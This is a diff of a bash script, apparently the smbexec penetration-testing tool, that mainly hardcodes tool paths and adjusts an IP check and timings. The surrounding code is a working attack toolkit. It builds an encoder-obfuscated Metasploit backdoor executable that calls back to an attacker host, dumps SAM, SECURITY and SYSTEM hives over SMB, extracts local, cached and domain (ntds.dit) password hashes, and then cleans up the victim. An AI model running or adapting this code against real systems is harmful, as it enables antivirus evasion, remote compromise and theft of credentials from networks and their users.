@@ -39,8 +39,20 @@ fi
 
 trap f_ragequit 2
 
-# Find the files and set the path values based on machine architecture
-smbexecpath=$(locate -l 1 smbexeclient | sed 's,/*[^/]\+/*$,,')
+# If you prefer smbexec find the files and set the path values based on machine architecture uncomment the lines below:
+#smbexecpath=$(locate -l 1 smbexeclient | sed 's,/*[^/]\+/*$,,')
+#creddumpath=$(locate -l 1 -b "\pwdump.py" | sed 's,/*[^/]\+/*$,,')
+#eseexportpath=$(locate -l 1 -b "\esedbexport"| sed 's,/*[^/]\+/*$,,')
+#dsuserspath=$(locate -l 1 -b "\dsusers.py"| sed 's,/*[^/]\+/*$,,')
+
+# If you prefer to hardcoded the paths, you can do so here, just uncomment the lines below
+smbexecpath=/pentest/smbexec/progs
+creddumpath=/opt/creddump
+eseexportpath=/opt/esedbtools
+dsuserspath=/opt/NTDSXtract
+msfencodepath=/media/sdcard/metasploit-framework
+msfpayloadpath=/media/sdcard/metasploit-framework
+
 
 # Check if its Fedora or Red Hat, because they feel the need to be "special"
 if [ -e /etc/redhat-release ]; then
@@ -61,7 +73,7 @@ if [ ! -e /usr/local/samba/lib/smb.conf ]; then
 	cp $smbexecpath/patches/smb.conf /usr/local/samba/lib/smb.conf
 fi
 
-f_ragequit(){ 
+f_ragequit(){
 echo -e "\n\n\e[1;31m[-] Rage-quitting....\e[0m"
 sleep 3
 #check if we've got shells in play... if so, we clean those up first...
@@ -127,19 +139,19 @@ f_vanish(){
 		clear
 		f_banner
 		lhost=
-		
+
 		echo -e "\n\e[1;33mYou have chosen the following payload - $payload\e[0m"
 
 		# Gather info to build standard payload		
 		if [[ "$paychoice" == "4" ]]; then
 			while [ -z $lhost ]; do read -p " Enter DNS Host Name ex: www.attacker.com : " lhost; done
 		else
-				
+
 		#List interfaces w/ their IPs		
 			echo -e "\nActive Interfaces:\n"
 			ifconfig | awk '/Link encap:Eth/ {print;getline;print}' | sed '{ N; s/\n/ /; s/Link en.*.HWaddr//g; s/ Bcast.*//g; s/UP.*.:1//g; s/inet addr/IP/g; }' | sed '$a\\n'
 			while [ -z $lhost ]; do read -p " Enter Local Host (LHOST) IP address : " lhost
-			    if [[ ! $lhost =~ ^(25[0-4]{1}|2[0-4]{1}[0-9]{1}|[1]{0,1}[1-9]{0,1}[1-9]{1}|100|[1-9]{1}0){1}\.((25[0-4]|2[0-4][0-9]|[1]{0,1}[1-9]{0,1}[0-9]{1}|100){1}\.){2}(25[0-4]{1}|2[0-4]{1}[0-9]{1}|[1]{0,1}[1-9]{0,1}[1-9]{1}|100|[1-9]{1}0){1}$ ]]; then
+			    if [[ ! $lhost =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
 			        lhost=
 			    fi
 			done
@@ -150,12 +162,8 @@ f_vanish(){
 	}
 
 	f_build_payload(){
-		if [ "$isrhfedora" == "1" ];then
-			mingw=$(find /usr/bin | grep mingw32-gcc$)
-		else
-			mingw=$(find /usr/bin | grep msvc-gcc$|grep 86)
-		fi
-		
+		mingw=i586-mingw32msvc-gcc
+
 		echo -e "\n\e[1;33mBuilding your payload please be patient...\e[0m"
 
 		# Create backdoor.exe - puts the file together in order -al14s
@@ -165,7 +173,7 @@ f_vanish(){
 		if [[ "$paychoice" -le "2" ]]; then p=" SessionCommunicationTimeout=600"; fi
 		echo -e '#include <stdio.h>\nunsigned char ufs[]=' > $logfldr/backdoor.c
 		for (( i=1; i<=10000;i++ )) do echo $RANDOM $i; done | sort -k1| cut -d " " -f2| head -$seed | sed 's/$/"/' | sed 's/^/"/' | sed '$a;' >> $logfldr/backdoor.c
-		msfpayload "$payload" LHOST="$lhost" LPORT="$port"$p EXITFUNC=thread R | msfencode -e x86/shikata_ga_nai -c $enumber -t raw | msfencode -e x86/jmp_call_additive -c $enumber -t raw | msfencode -e x86/call4_dword_xor -c $enumber -t raw | msfencode -e x86/shikata_ga_nai -c $enumber | sed -e 's/+/ /g' | sed -e 's/buf = /unsigned char micro[]=/g' | sed '$a;' >> $logfldr/backdoor.c
+		$msfpayloadpath/msfpayload "$payload" LHOST="$lhost" LPORT="$port"$p EXITFUNC=thread R | $msfencodepath/msfencode -e x86/shikata_ga_nai -c $enumber -t raw | $msfencodepath/msfencode -e x86/jmp_call_additive -c $enumber -t raw | $msfencodepath/msfencode -e x86/call4_dword_xor -c $enumber -t raw | $msfencodepath/msfencode -e x86/shikata_ga_nai -c $enumber | sed -e 's/+/ /g' | sed -e 's/buf = /unsigned char micro[]=/g' | sed '$a;' >> $logfldr/backdoor.c
 		echo -e "int main(void) { ((void (*)())micro)();}\nunsigned char tap[]=" >> $logfldr/backdoor.c
 		for (( i=1; i<=999999;i++ )) do echo $RANDOM $i; done | sort -k1| cut -d " " -f2| head -$seed | sed 's/$/"/' | sed 's/^/"/'| sed '$a;' >> $logfldr/backdoor.c
 		echo -e "\n\e[1;33mCompiling executable...\e[0m"
@@ -294,7 +302,6 @@ f_banner(){
 
 #Function to grab local hashes and domain cached creds
 f_hashgrab(){
-creddumpath=$(locate -l 1 -b "\pwdump.py" | sed 's,/*[^/]\+/*$,,')
 
 if [ ! -e "$logfldr"/hashes ]; then
 	mkdir $logfldr/hashes
@@ -353,16 +360,16 @@ fi
 		$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/C$ -c "get \\WINDOWS\\Temp\\sys $logfldr/hashes/$i/sys" &> /dev/null
 		#cleanup the host
 		$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C DEL C:\Windows\Temp\sam && DEL C:\Windows\Temp\sec && DEL C:\Windows\Temp\sys" &> /dev/null
-	
+
 		#Get the hashes out of the reg keys
 		if [ -e $logfldr/hashes/$i/sam ] && [ -e $logfldr/hashes/$i/sec ] && [ -e $logfldr/hashes/$i/sys ]; then
 			$creddumpath/pwdump.py $logfldr/hashes/$i/sys $logfldr/hashes/$i/sam > $logfldr/hashes/$i/localhashes.lst
 			$creddumpath/cachedump.py $logfldr/hashes/$i/sys $logfldr/hashes/$i/sec > $logfldr/hashes/$i/dcchashes.lst
 			echo -en "\n\e[1;32m[+] Hashes from $i have been dumped...\e[0m"
-			sleep 2
+			sleep 5
 		    else
 			echo -en "\n\e[1;31m[!] Something happened and I couldn't get the registry keys from $i...\e[0m"
-			sleep 2
+			sleep 5
 		fi
 	fi
 
@@ -461,7 +468,6 @@ fi
 f_esedbexport(){
 echo -e "\n\e[1;33mExtracting data and link tables from the ntds.dit file...\e[0m"
 sleep 2
-eseexportpath=$(locate -l 1 -b "\esedbexport"| sed 's,/*[^/]\+/*$,,')
 $eseexportpath/esedbexport -l /tmp/smbexec/esedbexport.log -t /tmp/smbexec/ntds.dit $logfldr/hashes/DC/ntds.dit
 datatable=$(ls /tmp/smbexec/ntds.dit.export/ | grep datatable)
 linktable=$(ls /tmp/smbexec/ntds.dit.export/ | grep link_table)
@@ -470,7 +476,6 @@ linktable=$(ls /tmp/smbexec/ntds.dit.export/ | grep link_table)
 f_dsusers(){
 echo -e "\n\e[1;33mExtracting hashes, please standby...\e[0m"
 sleep 2
-dsuserspath=$(locate -l 1 -b "\dsusers.py"| sed 's,/*[^/]\+/*$,,')
 python $dsuserspath/dsusers.py /tmp/smbexec/ntds.dit.export/$datatable /tmp/smbexec/ntds.dit.export/$linktable --passwordhashes $logfldr/hashes/DController/sys --passwordhistory $logfldr/hashes/DC/sys --certificates --suplcreds $logfldr/hashes/DC/sys --membership > $logfldr/hashes/DC/ntds.output
 $smbexecpath/ntdspwdump.py $logfldr/hashes/DC/ntds.output > $logfldr/hashes/DC/dc-hashes.lst
 
@@ -558,7 +563,7 @@ f_enumshares(){
 		cd $smbexecpath
 		./smbexeclient -L $i -A /tmp/smbexec/smbexec.auth >& /tmp/smbexec/connects.tmp
 		cd - &> /dev/null
-	
+
 		f_smbauthinfo
 		#What we are going to show the user
 		if [ ! -z "$logonfail" ]; then
@@ -763,7 +768,7 @@ f_getsome(){
 		unset badshare
 		unset unreachable
 	done
-	
+
 	if [ -s /tmp/smbexec/hosts.loot.tmp ]; then
 		echo -e "\n\e[1;33mReady for cleanup!  Hit enter when the shells stop rolling in...\e[0m"
 		read
